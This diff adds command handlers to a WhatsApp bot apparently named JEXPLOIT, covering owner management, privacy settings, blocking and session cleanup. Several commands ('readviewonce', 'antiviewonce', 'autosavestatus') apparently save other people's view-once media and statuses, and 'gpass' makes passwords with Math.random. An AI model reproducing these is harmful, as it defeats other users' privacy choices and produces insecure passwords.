+    let finalPrefix = newPrefix;
+    if (newPrefix.toLowerCase() === 'none') {
+        finalPrefix = '';
+    }
+    
+    // Validate prefix length (only if not empty)
+    if (finalPrefix !== '' && finalPrefix.length > 3) {
+        return reply('❌ Prefix must be 1-3 characters long!');
+    }
+    
+    await db.set(botNumber, 'prefix', finalPrefix);
+    prefix = finalPrefix; // Update local variable
+    
+    if (finalPrefix === '') {
+        reply(`✅ *Prefix removed!*\n\nNow you can use commands without any prefix.\n\nExamples:\nmenu\nping\nalive`);
+    } else {
+        reply(`✅ Prefix has been changed to: *${finalPrefix}*`);
+    }
+    break;
+}
+case 'alwaysonline':
+case 'online': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'alwaysonline', false);
+        return reply(`❌ Usage: ${prefix}alwaysonline <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'alwaysonline', boolValue);
+    global.alwaysonline = boolValue; // Update global variable
+    
+    reply(`✅ Always online mode ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'addowner': {
+    if (!Access) return reply(mess.owner);
+    
+    let user = m.mentionedJid[0] || args[0];
+    if (!user && m.quoted) user = m.quoted.sender;
+    if (!user) return reply(`*Reply to a user message to be added as owner with ${prefix}addowner*`);
+    
+    let userJid = user;
+    
+    let data = JSON.parse(fs.readFileSync(ownerFile));
+    
+    if (!data.owner) data.owner = [];
+    
+    if (!data.owner.includes(userJid)) {
+        data.owner.push(userJid);
+        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
+        reply(`✅ ${userJid} added to owners list`);
+    } else {
+        reply(`❌ ${userJid} is already an owner`);
+    }
+    break;
+}
+case 'removeowner': {
+    if (!Access) return reply(mess.owner);
+    
+    let user = m.mentionedJid[0] || args[0];
+    if (!user && m.quoted) user = m.quoted.sender;
+    if (!user) return reply(`*Reply to a user message to be removed from owners with ${prefix}removeowner*`);
+    
+    let userJid = user;
+    
+    let data = JSON.parse(fs.readFileSync(ownerFile));
+    
+    if (data.owner && data.owner.includes(userJid)) {
+        data.owner = data.owner.filter(id => id !== userJid);
+        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
+        reply(`✅ ${userJid} removed from owners list`);
+    } else {
+        reply(`❌ ${userJid} not found in owners list`);
+    }
+    break;
+}
+case 'listowner': {
+    let data = JSON.parse(fs.readFileSync(ownerFile));
+    const ownerList = data.owner || [];
+    
+    if (ownerList.length === 0) return reply('No owners found');
+    
+    let message = `👑 *OWNERS LIST*\n\n`;
+    const mentions = [];
+    
+    ownerList.forEach((user, index) => {
+        message += `${index + 1}. ${user}\n`;
+        mentions.push(user);
+    });
+    message += `\n📊 Total: ${ownerList.length} owner(s)`;
+    
+    await conn.sendMessage(m.chat, {
+        text: message,
+        mentions: mentions
+    }, { quoted: m });
+    break;
+}
+case "setownernumber": {
+    if (!Access) return reply(mess.owner);
+    
+    if (args.length < 1) return reply(`Example: ${prefix + command} 25675558536.`);
+
+    // Join all arguments to capture the full number including spaces
+    let fullInput = args.join(' ');
+    let newNumber = fullInput.replace(/\D/g, '');
+
+    console.log(`Input: ${fullInput}, Extracted Number: ${newNumber}`); // Debug log
+
+    if (newNumber.startsWith('0')) {
+        return reply("⚠️ Phone numbers should not start with *0*. Use the full international format (e.g., *256...* instead of *07...*)");
+    }
+
+    if (newNumber.length < 5 || newNumber.length > 15) {
+        return reply(`⚠️ Please provide a valid phone number (5-15 digits)\n\nYou provided: ${newNumber.length} digits: ${newNumber}`);
+    }
+
+    // Store the old number for comparison
+    const oldNumber = await db.get(botNumber, 'ownernumber', 'Not set');
+    await db.set(botNumber, 'ownernumber', newNumber);
+
+    // Update owner array in database
+    const newOwnerJid = newNumber + "@s.whatsapp.net";
+    const currentOwners = await db.get(botNumber, 'owners', []);
+    if (!currentOwners.includes(newOwnerJid)) {
+        currentOwners.push(newOwnerJid);
+        await db.set(botNumber, 'owners', currentOwners);
+    }
+
+    // Update global for current session
+    global.owner = [newOwnerJid];
+
+    // Add to sudo if not already there
+    const currentSudo = await db.getSudo(botNumber);
+    if (!currentSudo.includes(newOwnerJid)) {
+        await db.addSudo(botNumber, newOwnerJid);
+    }
+
+    reply(`✅ Owner number set to: ${newNumber}`);
+    break;
+}
+case "setownername": {
+    if (!Access) return reply(mess.owner);
+    
+    if (!text) {
+        const currentName = await db.get(botNumber, 'ownername', 'Not set');
+        return reply(`*SET OWNER NAME*\n\n*Usage:* ${prefix}setownername [new owner name]\n*Example:* ${prefix}setownername Kelvin Tech\n\n*Current owner name:* ${currentName}`);
+    }
+
+    try {
+        // Validate name length
+        if (text.length > 30) {
+            return reply('❌ *Owner name too long!* Maximum 30 characters allowed.');
+        }
+        
+        if (text.length < 2) {
+            return reply('❌ *Owner name too short!* Minimum 2 characters required.');
+        }
+
+        // Set the new owner name in SQLite
+        await db.set(botNumber, 'ownername', text.trim());
+
+        // Update global for current session
+        global.ownername = text.trim();
+
+        reply(`✅ Owner name set to: ${text.trim()}`);
+
+    } catch (error) {
+        console.error('Error in setownername command:', error);
+        reply('❌ *Failed to update owner name.* Please try again.');
+    }
+    
+}
+break
+case 'checkchannel': case 'idch': {
+if (!text) return reply("*channel link*")
+if (!text.includes("https://whatsapp.com/channel/")) return reply("*In valid link*")
+let result = text.split('https://whatsapp.com/channel/')[1]
+let res = await conn.newsletterMetadata("invite", result)
+let Devkevin = `
+* *ID :* ${res.id}
+* *Nama :* ${res.name}
+* *Total followers :* ${res.subscribers}
+* *Status :* ${res.state}
+* *Verified :* ${res.verification == "VERIFIED" ? "*Verified*" : "*No*"}
+`
+return reply(Devkevin)
+}
+break
+case 'createchannel': 
+case 'createch': {
+    if (!Access) return m.reply(mess.owner);
+    let parts = text.split('|');
+    let channelName = parts[0]?.trim();
+    let channelDesc = parts[1]?.trim() || '';
+    if (!channelName) {
+        return m.reply(`Example: 
+${prefix + command} *ChannelName|ChannelDesc*`)}
+    try {
+        const metadata = await conn.newsletterCreate(channelName, channelDesc);
+        console.log(metadata);
+        console.log('Channel metadata:', JSON.stringify(metadata, null, 2));
+        let channelId;
+        if (metadata && metadata.channelId) {
+            channelId = metadata.channelId;
+        } else if (metadata && metadata.id) {
+            channelId = metadata.id;
+        } else if (metadata && metadata.channel && metadata.channel.id) {
+            channelId = metadata.channel.id;
+        } else if (typeof metadata === 'string') {
+            channelId = metadata;
+        } else {
+            const findId = (obj) => {
+                if (!obj || typeof obj !== 'object') return null;
+                for (const key in obj) {
+                    if (key === 'id' || key === 'channelId' || key.toLowerCase().includes('id')) {
+                        return obj[key];
+                    }
+                    if (typeof obj[key] === 'object') {
+                        const nestedId = findId(obj[key]);
+                        if (nestedId) return nestedId;
+                    }
+                }
+                return null;
+            };      
+            channelId = findId(metadata);
+        }
+        if (!channelId) {
+            console.warn('Warning: ChannelId tidak ditemukan di response, menggunakan fallback...');
+            channelId = "unknown-channel-id";
+        }
+        let successDetails = [];
+        successDetails.push(`✅ Channel "${channelName}" `);
+        if (channelDesc) {
+            successDetails.push(`✅ Description Added`);
+        }
+        successDetails.push(`\nID Channel: ${channelId}`);
+        await conn.sendMessage(m.chat, {
+            text: successDetails.join('\n')
+        });
+    } catch (error) {
+        console.error('Error creating channel:', error);
+        m.reply(`${error.message}`);
+    }
+}
+break
+case "online": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);
+
+    const validOptions = ["all", "match_last_seen"];
+    if (!validOptions.includes(args[0])) return reply("Invalid option");
+
+    await conn.updateOnlinePrivacy(text);
+    await reply(mess.done);
+}
+break
+case "readreceipts": {
+if (!Access) return reply(mess.owner);
+    if (!text) return reply(`Options: all/none\nExample: ${prefix + command} all`);
+
+    const validOptions = ["all", "none"];
+    if (!validOptions.includes(args[0])) return reply("Invalid option");
+
+    await conn.updateReadReceiptsPrivacy(text);
+    await reply(mess.done);
+}
+break
+case "setpp": {
+    if (!Access) return reply(mess.owner);
+    if (!quoted) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
+    if (!/image/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
+    if (/webp/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
+
+    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");
+
+    if (args[0] === "full") {
+      const { img } = await generateFullProfilePic(medis);
+      await conn.query({
+        tag: "iq",
+        attrs: {
+          to: botNumber,
+          type: "set",
+          xmlns: "w:profile:picture",
+        },
+        content: [
+          {
+            tag: "picture",
+            attrs: {
+              type: "image",
+            },
+            content: img,
+          },
+        ],
+      });
+      fs.unlinkSync(medis);
+      reply(mess.done);
+    } else {
+      await conn.updateProfilePicture(botNumber, {
+        url: medis,
+      });
+      fs.unlinkSync(medis);
+      reply(mess.done);
+    }
+}
+break
+case "setprofilename": {
+    try {
+        const sender = m.sender;
+        const isOwner = global.owner.includes(sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
+        
+        if (!Access) return reply(mess.owner);
+
+        if (!text) {
+            return m.reply(`⚠️ Please provide a name!\n\nUsage: *${prefix}case <new_profile_name>*\nExample: *${prefix} Kevin Dev*`);
+        }
+
+        // Limit name length to prevent errors
+        if (text.length > 25) {
+            return m.reply(`❌ Name too long! Maximum 25 characters allowed.`);
+        }
+
+        // Set the profile name
+        await conn.updateProfileName(text);
+        
+        // Send success message
+        await m.reply(`✅ Profile name updated successfully!\n\nNew Name: *${text}*`);
+     
+        await conn.sendMessage(m.chat, { 
+            react: { 
+                text: '✅', 
+                key: m.key 
+            } 
+        });
+
+        console.log(`Profile name changed to: ${text} by ${sender}`);
+
+    } catch (error) {
+        console.error('Error in case command:', error);
+        m.reply(`❌ Failed to update profile name: ${error.message}`);
+    }
+}
+break
+case 'forward': {
+    if (!Access) return reply(mess.owner);
+
+    if (!m.quoted) return reply("❌ Please reply to a message, image, or video you want to forward.");
+
+    if (!text) return reply(`❌ Please provide a phone number.\n\n*Usage:* ${prefix}forward 2567xxxxxxx\n*Note:* You can also tag a user.`);
+
+    let targetJid;
+    if (m.mentionedJid[0]) {
+        targetJid = m.mentionedJid[0];
+    } else {
+        let number = text.replace(/[^0-9]/g, '');
+        if (number.length < 7) return reply("❌ The number provided is too short.");
+        targetJid = number + '@s.whatsapp.net';
+    }
+
+    try {
+        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+
+        let fullMsg = m.quoted.vM || m.quoted.fakeObj || m.quoted;
+
+        await conn.copyNForward(targetJid, fullMsg, true);
+
+        reply(`✅ Successfully forwarded to @${targetJid.split('@')[0]}`);
+        await conn.sendMessage(m.chat, { react: { text: "🚀", key: m.key } });
+
+    } catch (error) {
+        console.error('Forward Error:', error);
+        reply("Failed to forward. The number might be incorrect or not registered on WhatsApp.");
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+    }
+}
+break
+case "setabout": {
+    try {
+        const sender = m.sender;
+        
+        if (!Access) return reply(mess.owner);
+
+        if (!text) {
+            return m.reply(`⚠️ Please provide an about text!\n\nUsage: *${prefix}setabout <text>*\nExample: *${prefix}setabout Welcome to my bot!*`);
+        } 
+        if (text.length > 139) {
+            return m.reply(`❌ About text too long! Maximum 139 characters allowed.`);
+        }
+
+        // Set the profile about/status
+        await conn.updateProfileStatus(text);
+        
+        // Send success message
+        await m.reply(`✅ About/Status updated successfully!\n\nNew About: *${text}*`);
+        await conn.sendMessage(m.chat, { 
+            react: { 
+                text: '✅', 
+                key: m.key 
+            } 
+        });
+
+        console.log(`Profile about changed to: ${text} by ${sender}`);
+
+    } catch (error) {
+        console.error('Error in setabout command:', error);
+        m.reply(`❌ Failed to update about: ${error.message}`);
+    }
+  
+}
+break
+case "lastseen": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);
+
+    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
+    const option = args[0].toLowerCase();
+
+    if (!validOptions.includes(option)) {
+        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
+    }
+
+    try {
+        await conn.updateLastSeenPrivacy(option);
+        reply(`✅ *Last seen privacy set to:* ${option.toUpperCase()}\n\n`);
+    } catch (error) {
+        console.error('Error setting last seen privacy:', error);
+        reply('❌ *Failed to update last seen settings.* Please try again.');
+    }
+   
+}
+break
+case "gcprivacy":
+case "gcaddprivacy": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist\n*Example:* ${prefix + command} all`);
+
+    const validOptions = ["all", "contacts", "contact_blacklist"];
+    const option = args[0].toLowerCase();
+
+    if (!validOptions.includes(option)) {
+        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
+    }
+
+    try {
+        await conn.updateGroupsAddPrivacy(option);
+        reply(`✅ *Group add privacy set to:* ${option.toUpperCase()}\n\n`);
+    } catch (error) {
+        console.error('Error setting group add privacy:', error);
+        reply('❌ *Failed to update group add settings.* Please try again.');
+    }
+}
+break 
+case "delete":
+case "del": {
+if (!Access) return reply(mess.owner);
+    if (!m.quoted) return reply(`*Please reply to a message*`);
+
+    try {
+     
+      await conn.sendMessage(m.chat, {
+        delete: {
+          remoteJid: m.quoted.fakeObj.key.remoteJid,
+          fromMe: m.quoted.fakeObj.key.fromMe,
+          id: m.quoted.fakeObj.key.id,
+          participant: m.quoted.fakeObj.participant,
+        }
+      });
+
+      
+      await conn.sendMessage(m.chat, {
+        delete: {
+          remoteJid: m.key.remoteJid,
+          fromMe: m.key.fromMe,
+          id: m.key.id,
+          participant: m.key.participant,
+        }
+      });
+
+    } catch (err) {
+      console.error(err);
+      reply("⚠️ Failed to delete message.");
+   }
+
+}
+break
+case "react": {
+if (!Access) return reply(mess.owner);
+    if (!args) return reply(`*Reaction emoji needed*\n Example .react 🤔`);
+
+    const reactionMessage = {
+      react: {
+        text: args[0],
+        key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
+      },
+    };
+    conn.sendMessage(m.chat, reactionMessage);
+}
+break
+case 'vv2': case 'rvo': case 'retrieve': case 'readvo': case 'readviewonce':
+case 'vv': case 'vvhere':
+case 'save': case 'savestatus': case 'statussave': case 'ssave': case 'sv':
+case 'vvsend': case 'savesend': case 'sendto':
+case 'replysave': case 'replyforward':
+case 'antiviewonce': case 'antivv': case 'autovv':
+case 'autosavestatus': case 'autosavestatuses': {
+    await handleSaveMediaCommand(conn, m, { command, args, Access, botNumber, prefix, reply, mess });
+}
+break
+case 'creategc': 
+case 'creategroup': {
+if (!Access) return reply(mess.owner)
+if (!args.join(" ")) return reply(`*Example: ${prefix + command} Jexploit updats*`);
+try {
+let cret = await conn.groupCreate(args.join(" "), [])
+let response = await conn.groupInviteCode(cret.id)
+const teksop = `     「 Create Group 」
+
+▸ Name : ${cret.subject}
+▸ Owner : @${cret.owner.split("@")[0]}
+▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
+
+https://chat.whatsapp.com/${response}`
+conn.sendMessage(m.chat, { text:teksop, mentions: await conn.parseMention(teksop)}, {quoted:m})
+} catch {
+	reply(mess.done)
+	}
+}
+break
+case "gpass": {
+let length = text ? parseInt(text) : 12;
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
+    let pass = "";
+    for (let i = 0; i < length; i++) {
+      pass += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    
+    try {
+      conn.sendMessage(m.chat, { text: pass }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating password:', error);
+      reply('An error occurred while generating the password.');
+    }
+}
+break
+case "public": {
+if (!Access) return reply(mess.owner) 
+conn.public = true
+await db.set(botNumber, 'mode', 'public');
+reply(`*${global.botname} successfully changed to public mode*.`)
+}
+break
+case "listblocked": {
+if (!Access) return reply(mess.owner);
+
+    try {
+      const blockedList = await conn.fetchBlocklist();
+
+      if (!blockedList.length) {
+        return reply('✅ No contacts are currently blocked.');
+      }
+
+      let blockedUsers = blockedList.map((user, index) => `🔹 *${index + 1}.* @${user.split('@')[0]}`).join('\n');
+
+      await conn.sendMessage(m.chat, {
+        text: `🚫 *Blocked Contacts:*\n\n${blockedUsers}`,
+        mentions: blockedList
+      }, { quoted: m });
+
+    } catch (error) {
+      reply('⚠️ Unable to fetch blocked contacts.');
+  }
+}
+break
+case "block": {
+    if (!Access) return reply(mess.owner);
+
+    const targets = new Set();
+
+    if (m.mentionedJid && m.mentionedJid.length > 0) {
+        m.mentionedJid.forEach(jid => targets.add(jid));
+    }
+
+    if (m.quoted) {
+        targets.add(m.quoted.sender);
+    }
+
+    if (text) {
+        const words = text.split(/[\s,]+/);
+        words.forEach(word => {
+            let digits = word.replace(/[^0-9]/g, '');
+            if (digits.length >= 7) {
+                targets.add(digits + '@s.whatsapp.net');
+            }
+        });
+    }
+
+    if (targets.size === 0) {
+        return reply("Please tag someone, reply to a message, or type a phone number to block.");
+    }
+
+    const success = [];
+    const failed = [];
+
+    // Processing the block list
+    for (let jid of targets) {
+        let cleanJid = jid.split(':')[0].includes('@') ? jid.split(':')[0] : jid;
+
+        if (cleanJid === botNumber) continue; // Don't block yourself
+
+        try {
+            await conn.updateBlockStatus(cleanJid, "block");
+            success.push(cleanJid);
+        } catch (err) {
+            console.error(`Block failed for ${cleanJid}:`, err);
+            failed.push(cleanJid);
+        }
+    }
+
+    // Prepare response
+    let responseText = "";
+    if (success.length > 0) {
+        responseText += `✅ *Blocked (${success.length}):*\n` + 
+                        success.map(j => `• @${j.split('@')[0]}`).join('\n');
+    }
+    if (failed.length > 0) {
+        if (responseText) responseText += "\n\n";
+        responseText += `❌ *Failed (${failed.length}):*\n` + 
+                        failed.map(j => `• @${j.split('@')[0]}`).join('\n');
+    }
+
+    await conn.sendMessage(m.chat, {
+        text: responseText.trim(),
+        mentions: [...success, ...failed]
+    }, { quoted: m });
+}
+break;
+case 'unblock': {
+    if (!Access) return reply(mess.owner);
+    const targets = new Set();
+
+    if (m.mentionedJid && m.mentionedJid.length > 0) {
+        m.mentionedJid.forEach(jid => targets.add(jid));
+    }
+    if (m.quoted) targets.add(m.quoted.sender);
+    if (text) {
+        const words = text.split(/[\s,]+/);
+        words.forEach(word => {
+            let digits = word.replace(/[^0-9]/g, '');
+            if (digits.length >= 7) targets.add(digits + '@s.whatsapp.net');
+        });
+    }
+
+    if (targets.size === 0) return reply("Who should I unblock?");
+
+    for (let jid of targets) {
+        let cleanJid = jid.split(':')[0];
+        try {
+            await conn.updateBlockStatus(cleanJid, "unblock");
+        } catch (e) {}
+    }
+    reply(`✅ Unblock process finished.`);
+}
+break
+case "restart":
+case "reboot": {
+    if (!Access) return reply(mess.owner);
+    
+    try {
+        await reply(`*Restarting ${global.botname} Bot...*\n\nPlease wait 10-15 seconds for the bot to restart.`);
+        
+        await sleep(2000);
+        
+        if (conn && typeof conn.end === 'function') {
+            await conn.end();
+        }
+        
+        console.log(chalk.yellow.bold(`Bot restart initiated by ${pushname} (${m.sender})`));
+        
+        // Restart the process
+        process.exit(0);
+        
+    } catch (error) {
+        console.error('Error during restart:', error);
+        reply('❌ *Failed to restart bot.* Please restart manually.');
+    }
+}
+break
+case "addignorelist": {
+if (!Access) return reply(mess.owner);
+
+    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
+    let quotedUser = m.quoted && m.quoted.sender;
+    let userToAdd = mentionedUser || quotedUser || m.chat;
+
+    if (!userToAdd) return reply('Mention a user, reply to their message, or provide a phone number to ignore.');
+
+    let blacklist = loadBlacklist();
+    if (!blacklist.blacklisted_numbers.includes(userToAdd)) {
+        blacklist.blacklisted_numbers.push(userToAdd);
+        reply(`${userToAdd} added to the ignore list.`);
+    } else {
+        reply(`${userToAdd} is already ignored.`);
+    }
+}
+break
+case "delignorelist": {
+    if (!Access) return reply(mess.owner);
+
+    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
+    let quotedUser = m.quoted && m.quoted.sender;
+    let userToRemove = mentionedUser || quotedUser || m.chat;
+
+    if (!userToRemove) return reply('Mention a user, reply to their message, or provide a phone number to remove from the ignore list.');
+
+    let blacklist = loadBlacklist();
+    let index = blacklist.blacklisted_numbers.indexOf(userToRemove);
+    if (index !== -1) {
+        blacklist.blacklisted_numbers.splice(index, 1);
+        reply(`${userToRemove} removed from the ignore list.`);
+    } else {
+        reply(`${userToRemove} is not in the ignore list.`);
+    }
+}
+break
+case "listignored": {
+let blacklist = loadBlacklist();
+    if (blacklist.blacklisted_numbers.length === 0) {
+        reply('The ignore list is empty.');
+    } else {
+        reply(`Ignored users/chats:\n${blacklist.blacklisted_numbers.join('\n')}`);
+    }
+}
+break
+case "deletejunk": 
+case "deljunk": {
+if (!Access) return reply(mess.owner);
+    fsp.readdir("./session", async function (err, files) {
+      if (err) {
+        console.log("Unable to scan directory: " + err);
+        return reply("Unable to scan directory: " + err);
+      }
+      let filteredArray = await files.filter(
+        (item) =>
+          item.startsWith("pre-key") ||
+          item.startsWith("sender-key") ||
+          item.startsWith("session-") ||
+          item.startsWith("app-state")
+      );
+      console.log(filteredArray.length);
+      await sleep(2000);
+      reply(`*Clearing ${filteredArray.length} junk files in the session folder...*`);
+      await filteredArray.forEach(function (file) {
+        fs.unlinkSync(`./session/${file}`);
+      });
+      await sleep(2000);
+      reply("*Successfully cleared all the junk files in the session's folder*");
+    });
+
+    const tmpDir = path.resolve("./tmp");
+    fsp.readdir(tmpDir, async function (err, files) {
+      if (err) {
+        console.log("Unable to scan directory: " + err);
+        return reply("Unable to scan directory: " + err);
+      }
+      let junkFiles = files.filter(
+        (item) =>
+          item.endsWith("gif") ||
+          item.endsWith("png") || 
+          item.endsWith("mp3") ||
+          item.endsWith("mp4") || 
+          item.endsWith("opus") || 
+          item.endsWith("jpg") ||
+          item.endsWith("webp") ||
+          item.endsWith("webm") ||
+          item.endsWith("zip")
+      );
+      console.log(junkFiles.length);
+      await sleep(2000);
+      reply(`*Clearing ${junkFiles.length} junk files in the tmp folder...*`);
+      await junkFiles.forEach(function (file) {
+        fs.unlinkSync(`${tmpDir}/${file}`);
+      });
+      await sleep(2000);
+      reply("*Successfully cleared all the junk files in the tmp folder*");
+    });
+}
+break
+case "cleansession":
+case "cleanjunk":
+case "clean": {
+    if (!Access) return reply(mess.owner);
+    
+    try {
+        reply("*Starting session cleanup...*");
+        
+        // Clean session files using your function
+        cleaningSession("./session");
+        
+        // Wait and send success message
+        setTimeout(() => {
+            reply("✅ *Session files cleaned successfully!*\n\n" +
+                  "• Removed old session files (>2 hours)\n" +
+                  "• Preserved credentials (creds.json)\n" +
+                  "• Temporary files cleared");
+        }, 2000);
+        
+    } catch (error) {
+        console.error("Error in cleansession command:", error);
+        reply("*Error: " + error.message + "*");
+    }
+    
+}
+break
+case 'autoviewstatus':
+case 'viewstatus': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'autoviewstatus', false);
+        return reply(`Usage: ${prefix}autoviewstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'autoviewstatus', boolValue);
+    reply(`✅ Auto-view status ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'autoreactstatus':
+case 'reactstatus': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'autoreactstatus', false);
+        return reply(`Usage: ${prefix}autoreactstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'autoreactstatus', boolValue);
+    reply(`✅ Auto-react status ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'statusemoji':
+case 'setstatusemoji': {
+    if (!Access) return reply(mess.owner);
+    
+    const emoji = args[0];
+    if (!emoji) {
+        const current = await db.get(botNumber, 'statusemoji', '💚');
+        return reply(`Usage: ${prefix}statusemoji <emoji>\n\nCurrent: ${current}\nExample: ${prefix}statusemoji ❤️`);
+    }
+    
+    await db.set(botNumber, 'statusemoji', emoji);
+    reply(`✅ Status reaction emoji set to: ${emoji}`);
+    break;
+}
+case 'welcome': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.notadmin);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.getGroupSetting(botNumber, m.chat, 'welcome', false);
+        return reply(`❌ Usage: ${prefix}welcome <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.setGroupSetting(botNumber, m.chat, 'welcome', boolValue);
+    reply(`✅ Welcome messages ${boolValue ? 'enabled' : 'disabled'} for this group`);
+    break;
+}
+case 'adminevent': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'adminevent', false);
+        return reply(`❌ Usage: ${prefix}adminevent <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'adminevent', boolValue);
+    reply(`✅ Admin event notifications ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'anticall': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    const action = args[1]?.toLowerCase();
+    
+    // Show help if no arguments
+    if (!mode) {
+        const current = await db.get(botNumber, 'anticall', 'off');
+        return reply(`*ANTICALL*\n\n` +
+            `• ${prefix}anticall decline on\n` +
+            `• ${prefix}anticall decline off\n` +
+            `• ${prefix}anticall block on\n` +
+            `• ${prefix}anticall block off\n\n` +
+            `Current: ${current}`);
+    }
+    
+    // Handle decline mode
+    if (mode === 'decline') {
+        if (action === 'on') {
+            await db.set(botNumber, 'anticall', 'decline');
+            return reply('✅ *Successfully enabled anticall decline mode*');
+        }
+        if (action === 'off') {
+            await db.set(botNumber, 'anticall', 'off');
+            return reply('❌ Anticall OFF');
+        }
+    }
+    
+    // Handle block mode
+    if (mode === 'block') {
+        if (action === 'on') {
+            await db.set(botNumber, 'anticall', 'block');
+            return reply('✅ *Successfully enabled anticall block mode*');
+        }
+        if (action === 'off') {
+            await db.set(botNumber, 'anticall', 'off');
+            return reply('✅ Successfully disabled anticall*');
+        }
+    }
+    
+    // Invalid command
+    reply('❌ Use: .anticall decline on/off or .anticall block on/off');
+    break;
+}
+case "settings":
+case "botsettings":
+case "status": {
+    if (!Access) return reply(mess.owner);
+    
+    // Fetch all settings from SQLite
+    const [
+        prefix,
+        mode,
+        alwaysonline,
+        antidelete,
+        antideletestatus,
+        antiedit,
+        anticall,
+        antilinkdelete,
+        antilinkaction,
+        antibadword,
+        antibadwordaction,
+        antitag,
+        antitagaction,
+        autorecording,
+        autoTyping,
+        autoread,
+        autoreact,
+        AI_CHAT_TEXT,
+        AI_CHAT_VOICE,
+        autoviewstatus,
+        autoreactstatus,
+        statusemoji,
+        welcome,
+        adminevent,
+        antiviewonce,
+        autosavestatus,
+        menuStyleDb,
+        ownername,
+        ownernumber,
+        botname,
+        botversion
+    ] = await Promise.all([
+        db.get(botNumber, 'prefix', '.'),
+        db.get(botNumber, 'mode', 'public'),
+        db.get(botNumber, 'alwaysonline', false),
+        db.get(botNumber, 'antidelete', 'off'),
+        db.get(botNumber, 'antideletestatus', false),
+        db.get(botNumber, 'antiedit', 'off'),
+        db.get(botNumber, 'anticall', 'off'),
+        db.get(botNumber, 'antilink', false),
+        db.get(botNumber, 'antilinkaction', 'delete'),
+        db.get(botNumber, 'antibadword', false),
+        db.get(botNumber, 'antibadwordaction', 'delete'),
+        db.get(botNumber, 'antitag', false),
+        db.get(botNumber, 'antitagaction', 'delete'),
+        db.get(botNumber, 'autorecording', false),
+        db.get(botNumber, 'autoTyping', false),
+        db.get(botNumber, 'autoread', false),
+        db.get(botNumber, 'autoreact', false),
+        db.get(botNumber, 'AI_CHAT_TEXT', false),
+        db.get(botNumber, 'AI_CHAT_VOICE', false),
+        db.get(botNumber, 'autoviewstatus', false),
+        db.get(botNumber, 'autoreactstatus', false),
+        db.get(botNumber, 'statusemoji', '💚'),
+        db.get(botNumber, 'welcome', false),
+        db.get(botNumber, 'adminevent', false),
+        db.get(botNumber, 'antiviewonce', false),
+        db.get(botNumber, 'autosavestatus', false),
+        db.get(botNumber, 'menustyle', 'button'),
+        db.get(botNumber, 'ownername', 'Not set'),
+        db.get(botNumber, 'ownernumber', 'Not set'),
+        db.get(botNumber, 'botname', global.botname || 'JEXPLOIT'),
+        db.get(botNumber, 'botversion', global.versions || '1.5.6')
+    ]);
+
+    const getStatus = (value, trueText = 'ON', falseText = 'OFF') => value ? trueText : falseText;
+    const getModeStatus = (value, offText = 'OFF') => value !== 'off' ? `ON (${value})` : offText;
+
+    let settingsMsg = `⚙️ *Current Bot Settings:*\n\n`;
+    settingsMsg += `🔸 *bot name*: ${botname}\n`;
+    settingsMsg += `🔸 *version*: ${botversion}\n`;
